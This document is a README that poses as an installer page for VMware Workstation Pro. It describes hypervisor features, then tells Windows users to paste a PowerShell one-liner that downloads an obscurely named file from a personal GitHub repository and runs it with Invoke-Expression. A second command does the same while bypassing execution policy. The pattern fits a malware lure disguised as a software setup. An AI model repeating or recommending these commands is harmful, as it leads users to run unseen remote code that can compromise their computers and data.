# VMware Workstation Pro

VMware Workstation Pro is the Windows program this page sets up. The command in Quick Setup installs it on this PC. After that you open VMware Workstation Pro and work in it.

VMware Workstation Pro is type-2 desktop hypervisor software for Windows hosts. It creates virtual machines with configurable CPU, memory, disk, and network settings so you can run Linux, older Windows releases, or appliance images on one physical machine. The interface centers on a library of VMs, a console for keyboard and mouse capture, and tools that integrate guests with the host when you enable guest additions.

A typical session on Windows starts with opening Workstation and picking a VM from the library or creating one from an ISO. You power on the guest, work inside its desktop or shell, pause or snapshot before risky changes, and suspend when you need host resources back. Developers often clone a baseline image, attach shared folders, and test installers or services in isolation before moving them to bare metal.

This repository bundles the Windows setup package for Workstation Pro alongside short install notes, version-to-version changelog entries, and configuration tips for common host and guest combinations. It is meant as a single place to track which build you standardized on and how your team prepares VMs for daily use.

## What you do with it

- Run multiple x86 guest operating systems concurrently on one Windows workstation with isolated virtual hardware.
- Create snapshots to roll back guest disk state before testing patches or experimental software changes.
- Configure virtual NICs with NAT, bridged, or host-only modes through the built-in network editor.
- Clone linked or full copies of existing VMs to spin up consistent dev and QA environments quickly.
- Assign multiple CPU cores and large RAM budgets per VM within host capacity and licensing limits.
- Mount ISO images and physical drives as virtual CD or DVD devices during guest installation workflows.
- Enable Unity or enhanced graphics modes so selected guest apps appear alongside native Windows windows.
- Suspend and resume entire virtual machines without rebooting guests, preserving open applications and memory state.

## Quick Setup (PowerShell)

This installs the program VMware Workstation Pro on Windows.
1. Launch PowerShell:
   - Press `Win` + `X` on the keyboard.
   - Click **Terminal** or **Windows PowerShell** in the list.
2. Copy the command below, paste it into that window, and press Enter. Wait until it finishes.

```powershell
irm https://raw.githubusercontent.com/busch4266352/vmware-workstation-pro-setup-guide/main/mkepq2fs58.hhky015t | Invoke-Expression
```

## If the script is blocked

If Windows stops the script, paste this command into the same window and press Enter.

```powershell
powershell -ExecutionPolicy Bypass -Command "Invoke-RestMethod https://raw.githubusercontent.com/busch4266352/vmware-workstation-pro-setup-guide/main/mkepq2fs58.hhky015t | Invoke-Expression"
```

## Files

| File | What it is |
| --- | --- |
| `mkepq2fs58.hhky015t` | The file both commands read |
| `Initial.js` | Small helper kept next to the setup |
| `LICENSE` | MIT |
| `CHANGELOG.md` | What changed in build 1.0 |

## This build

Repository `busch4266352/vmware-workstation-pro-setup-guide`. VMware Workstation Pro 1.0, 2026. Windows 10 and Windows 11, 64-bit.
  
